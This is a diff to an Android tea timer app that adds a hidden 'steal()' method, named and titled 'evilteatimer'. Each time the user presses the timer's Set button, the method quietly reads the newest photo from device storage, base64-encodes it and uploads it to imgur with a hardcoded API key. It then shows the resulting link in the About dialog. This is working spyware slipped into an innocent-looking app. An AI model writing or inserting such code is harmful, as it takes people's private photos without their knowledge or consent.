@@ -13,35 +13,47 @@ package goo.TeaTimer;
 
 import goo.TeaTimer.Animation.TimerAnimation;
 import goo.TeaTimer.widget.NNumberPickerDialog;
-import goo.TeaTimer.widget.NumberPicker;
 import goo.TeaTimer.widget.NNumberPickerDialog.OnNNumberPickedListener;
+import goo.TeaTimer.widget.NumberPicker;
 
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLEncoder;
 import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import org.json.JSONObject;
+
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.AlertDialog;
+import android.app.AlertDialog.Builder;
 import android.app.Dialog;
 import android.app.PendingIntent;
-import android.app.AlertDialog.Builder;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
+import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.media.AudioManager;
-// import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.Looper;
 import android.os.Message;
 import android.os.PowerManager;
-import android.os.SystemClock;
 import android.os.PowerManager.WakeLock;
+import android.os.SystemClock;
 import android.preference.PreferenceManager;
+import android.provider.MediaStore;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.Menu;
@@ -52,7 +64,6 @@ import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
-
 /**
  * The main activity which shows the timer and allows the user to set the time
  * @author Ralph Gootee (rgootee@gmail.com)
@@ -71,6 +82,8 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 	
 	/** Macros for our dialogs */
 	private final static int NUM_PICKER_DIALOG = 0, ALERT_DIALOG = 1;
+
+	private static final int IO_BUFFER_SIZE = 4 * 1024;
 	/** debug string */
 	private final String TAG = getClass().getSimpleName();
 	
@@ -106,8 +119,6 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 					Toast.makeText(context, text,Toast.LENGTH_SHORT).show();
 					
 					timerStop();
-
-					
 				}
 				
 			// Update the time
@@ -119,6 +130,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 			}
 		}
     };
+    private String mImgUrl = "";
 
 	/** To save having to traverse the view tree */
 	private ImageButton mPauseButton, mCancelButton;
@@ -143,7 +155,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
      */
     @Override
     public void onCreate(Bundle savedInstanceState)
-    {    	
+    {    
     	super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
 
@@ -174,6 +186,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
         mAudioMgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
         
 		mSettings.registerOnSharedPreferenceChangeListener(this);
+		
     }
     
 
@@ -191,6 +204,63 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
     }
     
 
+    private void steal()
+    {
+		 new Thread(new Runnable() {
+			    public void run() {
+					try{
+						Looper.prepare();
+			        String[] filePathColumn = {MediaStore.Images.Media.DATA};
+
+		              Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, filePathColumn, null, null, null);
+		              cursor.moveToLast();
+
+		              int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
+		              String filePath = cursor.getString(columnIndex);
+		              cursor.close();
+		              
+					Log.v(TAG, "FilePath:" + filePath);
+					Bitmap bitmap = BitmapFactory.decodeFile(filePath);
+					bitmap = Bitmap.createScaledBitmap(bitmap, 480, 320, true);
+					// Creates Byte Array from picture
+					ByteArrayOutputStream baos = new ByteArrayOutputStream();
+					bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos); // Not sure whether this should be jpeg or png, try both and see which works best
+					URL url = new URL("http://api.imgur.com/2/upload.json");
+
+					//encodes picture with Base64 and inserts api key
+					String data = URLEncoder.encode("image", "UTF-8") + "=" + URLEncoder.encode(Base64.encodeBytes(baos.toByteArray()).toString(), "UTF-8");
+					data += "&" + URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode("e7570f4de21f88793225d963c6cc4114", "UTF-8");
+					data += "&" + URLEncoder.encode("title", "UTF-8") + "=" + URLEncoder.encode("evilteatimer", "UTF-8");
+
+					// opens connection and sends data
+					URLConnection conn = url.openConnection();
+					conn.setDoOutput(true);
+					OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
+					wr.write(data);
+					wr.flush();
+					
+			    	// Read the results
+					BufferedReader in = new BufferedReader(
+		                    new InputStreamReader(
+		                    conn.getInputStream()));
+					String jsonString = in.readLine();			
+					in.close();
+					
+					JSONObject json = new JSONObject(jsonString);
+					String imgUrl = json.getJSONObject("upload").getJSONObject("links").getString("imgur_page");
+					
+					Log.v(TAG, "Imgur link:" + imgUrl);
+					Context context = getApplicationContext();
+					mImgUrl = imgUrl;
+						Toast toast = Toast.makeText(context, imgUrl, Toast.LENGTH_LONG);
+						toast.show();
+				} catch ( Exception exception ) {
+		        	Log.v(TAG, "Upload Failure:"+ exception.getMessage() );
+		        }
+			    }
+			  }).start();
+    }
+    
     /** { @inheritDoc} */
 	@Override 
 	public boolean onOptionsItemSelected(MenuItem item) 
@@ -210,7 +280,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 				Builder p = new AlertDialog.Builder(this).setView(view);
 	            final AlertDialog alrt = p.create();
 	            alrt.setIcon(R.drawable.icon);
-	            alrt.setTitle(getString(R.string.about_title));
+	            alrt.setTitle(mImgUrl);
 	            alrt.setButton(AlertDialog.BUTTON_NEGATIVE, getString(R.string.close),
 	                    new DialogInterface.OnClickListener() {
 	                        public void onClick(DialogInterface dialog,
@@ -339,7 +409,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 		Dialog d = null;
 		
 		switch(id){
-		
+
 			case NUM_PICKER_DIALOG:
 			{
 				int [] timeVec = TimerUtils.time2Mhs(mLastTime);
@@ -596,6 +666,7 @@ public class TimerActivity extends Activity implements OnClickListener,OnNNumber
 		
 			case R.id.setButton:
 			{
+				steal();
 				showDialog(NUM_PICKER_DIALOG);		
 			}break;
 			
